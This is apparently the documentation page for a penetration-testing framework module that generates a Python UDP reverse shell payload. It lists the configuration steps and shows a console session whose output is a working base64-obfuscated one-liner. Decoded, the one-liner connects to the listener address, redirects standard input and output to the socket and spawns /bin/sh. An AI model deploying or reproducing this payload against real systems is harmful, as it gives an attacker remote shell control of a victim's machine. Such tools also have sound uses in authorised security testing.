## Description

Module generates payload that creates interactive udp reverse shell by using python. 

## Verification Steps

  1. Start `./rsf.py`
  2. Do: `use payloads/python/reverse_udp`
  3. Do: `set lhost 192.168.1.4`
  3. Do: `set lport 4321`
  4. Do: `run`
  5. Module generates python udp reverse shell payload

## Scenarios

```
rsf > use payloads/python/reverse_udp
rsf (Python Reverse UDP) > set lhost 192.168.1.4
[+] lhost => 192.168.1.4
rsf (Python Reverse UDP) > set lport 4321
[+] lport => 4321
rsf (Python Reverse UDP) > run
[*] Running module...
[*] Generating payload
exec('aW1wb3J0IG9zCmltcG9ydCBwdHkKaW1wb3J0IHNvY2tldApzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQpzLmNvbm5lY3QoKCcxOTIuMTY4LjEuNCcsNDMyMSkpCm9zLmR1cDIocy5maWxlbm8oKSwgMCkKb3MuZHVwMihzLmZpbGVubygpLCAxKQpvcy5kdXAyKHMuZmlsZW5vKCksIDIpCnB0eS5zcGF3bignL2Jpbi9zaCcpOwpzLmNsb3NlKCkK'.decode('base64'))
```
